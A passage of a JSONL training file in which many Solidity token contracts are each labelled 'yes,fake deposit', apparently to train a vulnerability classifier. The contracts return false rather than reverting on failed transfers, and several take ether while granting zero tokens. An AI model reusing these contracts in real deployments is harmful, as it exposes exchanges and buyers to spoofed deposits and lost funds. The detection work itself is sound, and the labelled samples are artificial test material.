StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'WKDE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function WAKANDAINUTOKENETH() {\n balances[msg.sender] = 100000000000000000000000000000; \n totalSupply = 100000000000000000000000000000;\n name = \"WAKANDA INU TOKEN ETH\";\n decimals = 18; \n symbol = \"WKDE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract RicoContract is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 500000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000000; // Update total supply (100000 for example)\n name = \"RicoCoin\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"RICO\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract JapaneseChin is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'Chin.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function JapaneseChin() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Japanese Chin\";\n decimals = 18; \n symbol = \"Chin\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Sienna is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 10000000*10**uint256(decimals);\n string public constant name = \"Sienna\";\n string public constant symbol = \"SIENNA\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract NigerianEkuke is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'EKUKE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function NigerianEkuke() {\n balances[msg.sender] = 1000000000000000000000000000000; \n totalSupply = 1000000000000000000000000000000;\n name = \"Nigerian Ekuke\";\n decimals = 18; \n symbol = \"EKUKE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n\n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract STToken is UnboundedRegularToken {\n\n uint public totalSupply = 33*10**25;\n uint8 constant public decimals = 18;\n string constant public name = \"StarToken\";\n string constant public symbol = \"ST\";\n\n function STToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 2000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply =2000000000000000000000000000; // Update total supply (100000 for example)\n name = \"MSC BLUME\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"MRC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\ninterface ERC20Interface {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract SYSP is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"DOG COLLAR\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"COLLAR\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract FacebookToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Facebook Token\";\n string public constant symbol = \"FACE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address 